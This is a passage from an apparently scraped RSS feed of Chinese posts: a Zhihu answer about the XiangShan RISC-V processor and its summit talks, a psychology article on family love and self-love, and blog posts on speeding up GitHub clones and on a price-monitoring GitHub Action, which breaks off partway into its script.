如何快速捕捉、复现、定位bug是调试过程中非常关键的步骤，很多时间都是消耗在这个阶段。小伙伴们提出了<b>一种创新的轻量级仿真快照技术——把整个仿真程序看成是一个进程，利用fork机制创建子进程</b>。然后父进程继续执行，子进程暂停。当父进程出错时，则可以恢复到子进程进行调试。 LightSSS这个机制和Verilator仿真器自带的Savable机制相比，<b>单次快照时间缩短了近7000倍！</b>（余子濠将会在6月23日下午介绍LightSSS）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d06151ab7fdc64c000d348ddef83c940_720w.jpg?rss\" data-rawwidth=\"2049\" data-rawheight=\"1156\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d06151ab7fdc64c000d348ddef83c940\" data-watermark-src=\"v2-92cb4d30fea4ad3b9753de8c8472ef4e\" data-private-watermark-src=\"v2-6aa72886784ef4a4b800b816160c5e06\"></p>\n<p>15. 很多人质疑Chisel不方便调试。小伙伴们则充分<b>利用了Chisel的可以自定义Firrtl Transform的特点，设计了一套新型的硬件敏捷调试栈，可将基于波形的调试转换为基于事件的调试</b>。我们设计了一套工具，可以直接将高层语义新型从波形中提取出来，并进行可视化。为此，还专门设计了一个Xiang语言。（蔺嘉炜将在6月23日下午介绍该工作）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-30de046418f5d22ee635b92e35642145_720w.jpg?rss\" data-rawwidth=\"2052\" data-rawheight=\"1155\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-30de046418f5d22ee635b92e35642145\" data-watermark-src=\"v2-e3a37d7478d855f441c7d6c0e8b47a29\" data-private-watermark-src=\"v2-9235bb2c97526db9d5156cc8943b7a7d\"></p>\n<p>16. 处理器性能优化环节最关键是要快速准确地评估优化技术带来地性能收益。如果评估过程需要几天时间，那将会严重影响迭代优化效率。小伙伴们<b>设计了一个敏捷性能评估框架BetaPoint，它利用了三个机制——Sampling机制、Generic Full System Checkpoint机制和Functional Warmup机制，实现了可以在10个小时内估算出处理器地SPEC分数</b>。（周耀阳将会在6月23日傍晚介绍BetaPoint）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fa4dbb9e42f40e4482a2a4811a09d0b1_720w.jpg?rss\" data-rawwidth=\"2052\" data-rawheight=\"1159\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-fa4dbb9e42f40e4482a2a4811a09d0b1\" data-watermark-src=\"v2-1247f5f2b72bb0c2e61cbf704336313f\" data-private-watermark-src=\"v2-0edb35c8e9cf480ed1058c99ec1e948b\"></p>\n<p>17. 整个香山开发团队将在这次峰会上和大家分享22个技术报告。这些报告都是清一色的90后，很多都是95后：<b>勾凌睿、胡博涵、金越、李昕、刘志刚、蔺嘉炜、王华强、王诲喆、王凯帆、徐易难、余子濠、张传奇、张发旺、张林隽、张紫飞、张梓悦、周耀阳、周意可、邹江瑞</b>；此外还有多位参与香山开发的同学这次并没有投稿。这些小伙伴们在香山的开发过程中做出了不可替代的贡献。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b614f2e01b863c5cfb908fa1a1f9aa51_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1157\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b614f2e01b863c5cfb908fa1a1f9aa51\" data-watermark-src=\"v2-0945f698ffceb06040095f652e694df8\" data-private-watermark-src=\"v2-d96852c6d919197dfc95f97278d458db\"></p>\n<h2>四、香山未来如何发展？</h2>\n<p>18. 目前香山正在进行下一代架构“南湖”的开发，目标是今年年底流片，<b>基于14nm工艺频率达到2GHz，SPECCPU分值达到10分/GHz</b>。这是一个很有挑战的目标，需要对架构进行大幅度的优化改进。</p>\n<p>前几天，小伙伴们专门去了一趟嘉兴南湖，研讨香山未来的发展。除了技术，我们再一次聚焦到流程与平台。此前构建的敏捷设计流程与平台支撑了20多人的开发团队，这远远不够。现在我们需要考虑的是该<b>如何构建一套开源、开放、规范的开放流程，能支撑2000人的开源社区一起开发</b>。</p>\n<p>支持成千上万人一起开发开源软件，这已经有成功的经验。但是<b>如何支持数千人一起开发开源处理器，目前还没有可以参考的案例，只能靠我们自己摸索。也期待各界专家给我们更多的指导和建议。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8ea1302a036d8ffc732aa1c226f339b8_720w.jpg?rss\" data-rawwidth=\"2051\" data-rawheight=\"1155\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8ea1302a036d8ffc732aa1c226f339b8\" data-watermark-src=\"v2-793b94f8b0eec7f907f21f1d562bd5e3\" data-private-watermark-src=\"v2-8023bd1252eaa4120eb401c8f6a07ec5\"></p>\n<p>19. <b>我们有一个愿望——希望“香山”能存活30年；我们有一个约定——30年后再一起聚聚</b>，到时再看看香山会变成什么样。但是，要实现这个愿望，还有很多很多问题和挑战需要去解决。</p>\n<p>真诚地期待有更多伙伴加入香山的开发队伍！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b1603a84ecc4c42c91f0f33188c7fa7a_720w.jpg?rss\" data-rawwidth=\"2051\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b1603a84ecc4c42c91f0f33188c7fa7a\" data-watermark-src=\"v2-b96af9593681a914c73717477e1c6622\" data-private-watermark-src=\"v2-8a4397fa9b3223b2cd08eac29241c0de\"></p>\n<p>20. 香山是在<b>中科院计算所、鹏城实验室</b>的支持下，通过<b>中国开放指令生态（RISC-V）联盟</b>联合业界企业一起开发一款开源高性能RISC-V处理器核，也得到了<b>北京智源人工智能研究院</b>的支持。在此，要特别感谢<b>北京微核芯公司</b>的资深专家给予香山的开发强力的支持，他们非常认同开源理念，也是第一家与香山联合开发的企业。很高兴“南湖”架构的开发有了更多的合作伙伴，感谢对香山的支持。</p>\n<p>欢迎联系我们一起加入香山开源社区！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-59071133192692ae413604a2189e9489_720w.jpg?rss\" data-rawwidth=\"2047\" data-rawheight=\"1149\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-59071133192692ae413604a2189e9489\" data-watermark-src=\"v2-1ef4361d4c6191fc9ecb2e7cb82d4685\" data-private-watermark-src=\"v2-31afb68c844fef52a6cc59dd44865ca5\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-10552de2ba59e00f774123321f8b8f23_720w.jpg?rss\" data-rawwidth=\"4000\" data-rawheight=\"3000\" data-size=\"normal\" data-caption=\"香山团队部分成员在RISC-V中国峰会合影\" data-watermark=\"watermark\" data-original-src=\"v2-10552de2ba59e00f774123321f8b8f23\" data-watermark-src=\"v2-684fec7a3eaec7c13c325d6088f2e456\" data-private-watermark-src=\"v2-710c2dc279c00086328792dff2c65cd7\"></p>\n<h2>五、花絮</h2>\n<ul>\n<li>\n<b>一本关于香山的书</b>。很多人觉得CPU设计很难，很高大上，我们倒是希望能把这个门槛给降一降——所以打算出一本类似伯克利的《TCP/IP协议栈详解》和毛德操老师的《Linux内核源代码场景分析》那样的书，结合香山的源代码来分析CPU设计细节和诀窍（know-how）。这本书也可以用开源的方式由社区一起撰写，欢迎感兴趣的朋友一起参加。</li>\n<li>\n<b>“一生一芯”计划的回报</b>。首期“一生一芯”计划的五位同学（金越、王华强、王凯帆、张林隽、张紫飞）在本科一毕业便加入了香山的开发，成为了技术骨干。很多人都问他们什么时候毕业，可能需要再等等了。他们现在才研一，还要再等两年才会有同学毕业。</li>\n<li>\n<b>疫情中的封闭开发</b>。2020年6月初，北京新发地忽然出现了新冠疫情，导致同学们都无法回到北京。感谢深圳鹏城实验室的大力支持，整个团队全部集中到深圳，在鹏城实验室集中了三个月的封闭开发。那段时间基本上每周都有超过150个commit，反而成为开发效率最高的一个时间段。</li>\n<li>\n<b>香山的Logo</b>。我们尝试了很多个香山logo设计，最后经过大家投票选择了左下角的那个方案。不过有朋友好心告知香山的红叶主要是黄栌叶。好在香山也有五角枫，暂时就先定这个logo了。</li>\n</ul>\n<p><img src=\"https://pic1.zhimg.com/v2-b97c4c1e14d0e0cbcf9c894db122f3b0_720w.jpg?rss\" data-rawwidth=\"1972\" data-rawheight=\"968\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b97c4c1e14d0e0cbcf9c894db122f3b0\" data-watermark-src=\"v2-cf5f97f3924692117d5b4d690b8627b7\" data-private-watermark-src=\"v2-9f9e8e814fca2579b930d2ada4c89896\"></p>\n<hr>\n<h2>最后几句</h2>\n<p>有幸和阿里巴巴的戚总（戚肖宁）一起担任首届RISC-V中国峰会的联席大会主席，但其实幕后是中科院软件所和上海科技大学的老师们为这次峰会的筹备和保障工作付出了巨大的努力。</p>\n<p>由于疫情带来极大的不确定性，组委会始终保持高度紧张状态：一开始只开放了大约1500位线下参会名额，但很快就报满了；后来又开放了两次补报机会，但每次也只开放了200个名额，最后一共是2600人次（有的同时报名参加主会和分会）。</p>\n<p>但即使如此，最后因为广东那边的疫情原因，不得不安排大家远程参会。在此，对未能报上名的朋友说声抱歉，对报上名但因为疫情而选择放弃现场参会的朋友道声感谢。不过这次峰会提供了4个直播渠道，全程直播101个报告，并在后续会有视频回放。很抱歉直播中间也遇到了一些技术问题（有些上午调试好了下午还出错），在此再说声抱歉。</p>\n<p>特别感谢中科院软件所的吴伟老师和武延军老师，他们为筹备这次峰会而殚精竭虑，真的付出太多了。感谢上海科技大学信息学院周平强院长，协调上海本地各方资源，全力支持和保障峰会的顺利召开。也要感谢所有为峰会默默付出的筹备组成员和志愿者们！</p>\n<p>大家因RISC-V而汇聚到一起，正是因为RISC-V所带来的开源、开放、共享、共治是大家的共识，也是因为RISC-V为我们带来了无限的想象空间。如今，RISC-V已在中国蓬勃发展，中国也在RISC-V生态中贡献越来越多的力量——首届RISC-V中国峰会就是最好的写照。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bao-yun-gang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">包云岗</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/466393646/answer/1955410750?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">16 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/329960518?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">Intel公司在中国有芯片设计岗位吗？</a><br><a href=\"http://www.zhihu.com/question/278280318?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有了解广州粤芯半导体技术有限公司的吗？</a><br>\n","link":"http://www.zhihu.com/question/466393646/answer/1955410750?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"充满爱的家庭能给孩子带来什么？这些能否通过后天获得？","date":"2021-06-22 23:00:10","description":"\n<p>一个有爱的家庭，就像一片丰富的土壤，能给一个人的成长提供持续且足够的滋养与力量。</p>\n<p>如果没有一个有爱的家庭，就需要成年的自己，主动获得爱的滋养，为其注入营养。</p>\n<p><br></p>\n<p>根据美国儿童研究组织Child Trends的说法，一方面，父母对孩子的温暖与爱会带来更高的自尊、更好的学习成绩、更好的亲子沟通以及更少的心理和行为问题。另一方面，没有慈爱父母的<b>孩子往往自尊心较低，感觉更加疏远、敌意、好斗和反社会。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f904f83415be2c9ff487510f28be5995_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"854\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-f904f83415be2c9ff487510f28be5995\" data-watermark-src=\"v2-32289d6b6164d74dd6d441f762bfc86d\" data-private-watermark-src=\"v2-d405c66da1cb77eb3fcb6a4827471bf3\"></p>\n<p>下面我们来看一看相关研究。</p>\n<p><b>研究一：爱有助于孩子发展出稳定的情绪</b></p>\n<p>2010 年，杜克大学医学院的研究人员发现，拥有非常深情和细心的母亲的婴儿长大后会变得<b>更快乐、更有弹性、焦虑更少。[1]</b></p>\n<p>该研究涉及大约 500 人，他们从婴儿时期一直到 30 多岁。</p>\n<p>当婴儿八个月大时，心理学家观察了他们的母亲在他们进行了几次发育测试时与他们的互动。</p>\n<p>心理学家从“消极”到“饱满的爱”等五个程度对母亲的感情和关注程度进行了评估。近 10% 的母亲表现出低度的感情，85% 的母亲表现出正常的感情，约 6% 的母亲表现出高度的感情。</p>\n<p>30 年后，这些人接受了情绪健康的采访。</p>\n<p><b>母亲表现出“饱满的爱”或“爱抚”感情的成年人比其他人更不容易感到压力和焦虑。他们也不太可能报告敌意、令人痛苦的社交互动和心身症状。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e849fc3a02a4a35600e701ac0eb0201_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"853\" data-watermark=\"original\" data-original-src=\"v2-7e849fc3a02a4a35600e701ac0eb0201\" data-watermark-src=\"v2-da113f3a27b18042c5ab03b71d30f2bd\" data-private-watermark-src=\"v2-80da340cec6e711e7d83e25f761d0290\"></p>\n<p><b>研究二：爱有助于孩子的大脑发育</b></p>\n<p>大脑发育最重要的阶段是生命的开始，从子宫开始，然后是生命的第一年。到三岁时，儿童的大脑已达到其成人大小的近 90%。在此期间，这种快速的大脑生长和回路估计以每秒 700-1000 个突触连接的惊人速度发生。[2][3]</p>\n<p>婴儿与照顾者的经历对于这种早期脑回路的布线和修剪至关重要，并且良好的互动能够帮助婴儿在大脑中建立数以百万计的新突触连接。</p>\n<p><b>父母与孩子反复的互动和交流，会有助于提升孩子的记忆、建立关系的能力，同时能促进其逻辑发展。[4]</b></p>\n<p><br></p>\n<p><b>研究三：爱有助于孩子建立良好的依恋模式与关系</b></p>\n<p>在与人类接触极少的幸存“野蛮”儿童的悲惨案例研究表明，在缺乏爱、语言沟通的抚养的条件下，孩子的语言能力和情感发展能力会严重缺乏。</p>\n<p>另一项纵向研究报告称，对主要照顾者的不安全依恋可能会<b>显著削弱儿童在一生中形成和维持健康关系的能力。 [5]</b></p>\n<p>同时Teicher  报道了在早年遭受忽视（一种极端的不安全依恋形式）的儿童的以下病理状况[6]</p>\n<ul>\n<li> 左半球生长减慢，这可能会导致相关的抑郁症风险增加。</li>\n<li> 边缘​​系统的敏感性增加，这可能导致焦虑症。</li>\n<li> 可能导致学习和记忆障碍的海马体生长减少。</li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/v2-cf9e86f17b227b7a4b74af4e5159f9d4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"772\" data-watermark=\"original\" data-original-src=\"v2-cf9e86f17b227b7a4b74af4e5159f9d4\" data-watermark-src=\"v2-985cb8af8b9554ab842e5f31019e0609\" data-private-watermark-src=\"v2-a9fd5600a380ce7f0cbaffd8fe9d82b4\"></p>\n<p>通过以上列举的研究，我们不难发现一个人的情绪、建立关系的能力、安全感、患某些疾病的风险，都与童年时家庭是否有充足的爱有关。那是否如果我们没有成长在一个有爱的原生家庭里，我们后天就无法再改变了呢？</p>\n<p><br></p>\n<p>Margaret Paul 博士认为，以下的5步可以帮你学会爱自己，重建滋养出爱的土壤。[7]</p>\n<p><br></p>\n<p><b>第 1 步：愿意感受痛苦并对自己的感受负责。</b></p>\n<p>有意识地跟随你的呼吸，进入你的身体并拥抱你的所有感受。勇敢地体会你的感觉，例如，腹部有痉挛感、胸口闷时，体会这种身体感觉。不要试图用各种方法逃避感受，例如专注于你的头脑、评判自己、转向上瘾及麻木等。</p>\n<p><br></p>\n<p><b>第 2 步：了解你的情绪</b></p>\n<p>所有的感觉都是信息性的，提醒着你曾经发生了什么，有哪些创伤和问题还没有处理。</p>\n<p>致力于了解你的情绪，即使是那些可能让你痛苦的情绪，这样你才能开始采取爱的行动。</p>\n<p>试着为这些情绪命名、比如“焦虑”、“沮丧”、“愤怒”、“失望”，并细心了解它们什么时候出现、为什么出现、出现的形式与感觉等等。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5a6175e01708da6c1d82b59b1531df67_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"894\" data-watermark=\"original\" data-original-src=\"v2-5a6175e01708da6c1d82b59b1531df67\" data-watermark-src=\"v2-f4e36785f4559a343c8204021d3bb683\" data-private-watermark-src=\"v2-3604c464e20fcb98df0f3d98c2426611\"></p>\n<p><b>第 3 步：了解您的错误信念。</b></p>\n<p>第 3 步是一个深入而富有同情心的探索过程——了解你的信念和行为，以及可能导致你痛苦的人或情况是发生了什么。</p>\n<p>问问内在的感觉（内在感觉可能会以小男孩或小女孩的形象呈现）：“是什么导致了焦虑、抑郁、内疚、羞耻、嫉妒、愤怒、孤独或空虚的痛苦感觉？” 让答案来自内心，来自你的直觉和感受。</p>\n<p>一旦你了解了导致这些感觉的事件、想法、行为，问问你的自我关于导致自我放弃的想法和行为的恐惧和错误信念。</p>\n<p><br></p>\n<p><b>第4步：采取爱的行动</b></p>\n<p>有时人们认为“爱自己”是一种被召唤出来的感觉。看待爱自己的一个好方法是强调行动：<b>“我能做些什么来爱自己？</b>” ，而不是“我怎么能感受到对自己的爱？”</p>\n<p>比如，你觉得请自己吃大餐是爱自己，就去吃大餐，你觉得让伴侣给自己个拥抱是爱自己，就请求伴侣的拥抱。</p>\n<p>总之，落实到具体的行动上来爱自己。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-653c7ae6d9d90132e7733610395facfd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-653c7ae6d9d90132e7733610395facfd\" data-watermark-src=\"v2-a46001abf950678fd3e445b7047ff06c\" data-private-watermark-src=\"v2-b59ae966176d8f8275b6541a98101575\"></p>\n<p><b>第 5 步：评估您的行动并根据需要重新开始</b></p>\n<p>一旦你采取了爱的行动，检查一下你的痛苦、愤怒和羞耻是否得到了治愈。如果没有，你就会回到这些步骤，直到你发现真相和爱的行为，这些行为会给你带来平静、快乐和深刻的内在价值感。</p>\n<p>随着时间的推移，你会发现爱自己会改善你生活中的一切——你的人际关系、你的健康和幸福、你实现梦想的能力以及你的自尊。。</p>\n<p>爱自己并与自己建立联系是能够爱他人并与他人建立联系并建立爱的关系的关键。爱自己是创造热情、充实和快乐生活的关键。</p>\n<p><br></p>\n<p>爱与被爱对于每个孩子、每个成年人来说，都是至关重要的事情。</p>\n<p>我想请你相信一件非常重要的事情：<b>小时候的爱或许并不充足，但这并不意味着爱不存在，也不意味着长大后的我们不能去获取爱、学习爱。</b></p>\n<p>我很喜欢仓央嘉措的几句诗：你爱，或者不爱我，爱就在那里，不增不减。</p>\n<p>爱是一种能力，只要你想要去学习，就一定能学会、能获得。</p>\n<p><br></p>\n<p>关注 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/dee99bcf9da2172a7de2ce90a5f64542\" data-hash=\"dee99bcf9da2172a7de2ce90a5f64542\" data-hovercard=\"p$b$dee99bcf9da2172a7de2ce90a5f64542\">@壹心理</a> ，我们用专业的心理学知识、人性的爱与温度，陪伴你的心灵成长</p>\n<p>世界和我爱着你~</p>\n<p><br></p>\n<blockquote>参考资料：<br>[1]<a href=\"http://link.zhihu.com/?target=https%3A//www.mother.ly/child/how-a-parents-affection-shapes-a-childs-happiness-for-life\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">mother.ly/child/how-a-p</span><span class=\"invisible\">arents-affection-shapes-a-childs-happiness-for-life</span><span class=\"ellipsis\"></span></a><br>[2]Perry BD. Traumatized children: how childhood trauma influences brain development. <i>J. California Alliance Mentally Ill. </i>2000;11:48–51<br>[3]Rethinking evidence-based practice and two-generation programs to create the future of early childhood policy.<br>[4]Shore R. <i>Rethinking the brain.</i> New York, NY: Families and Work Institute; 1997.<br>[5]Perry BD. Vol. 3. Brain and mind; 2002. Childhood experience and the expression of genetic potential: what childhood neglect tells us about nature and nurture; pp. 79–100.<br>[6]Teicher MD. Wounds that time won’t heal: the neurobiology of child abuse. <i>Cerebrum: The Dana Forum on brain science. </i>2000;2:50–67<br>[7]<a href=\"http://link.zhihu.com/?target=https%3A//www.mindbodygreen.com/0-15295/how-do-you-actually-learn-to-love-yourself.html\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">mindbodygreen.com/0-152</span><span class=\"invisible\">95/how-do-you-actually-learn-to-love-yourself.html</span><span class=\"ellipsis\"></span></a>\n</blockquote>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yi-xin-li-1?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">壹心理</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/465547566/answer/1954604848?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">107 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/318331653?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">家庭对于孩子来说影响多大，又如何能够自我救赎？</a><br><a href=\"http://www.zhihu.com/question/451806172?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么现在的家庭已经不再是很多人的避风港呢？</a><br>\n","link":"http://www.zhihu.com/question/465547566/answer/1954604848?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"订阅 YFun's Blog","date":"2021-06-20 10:30:00","description":"\n<p>自 2021 年 6 月 20 日起，本博客将同步更新 Twitter 和 Telegram 频道(由 IFTTT 提供支持)。</p>\n<ul>\n<li><a href=\"https://t.me/s/always_explore\">Telegram Channel</a></li>\n<li><a href=\"https://twitter.com/OhhhCKY\">Twitter</a></li>\n</ul>\n","link":"https://blog.yfun.top/posts/3249015232/"},{"title":"加速 GitHub 下载","date":"2021-06-18 17:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 18:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span 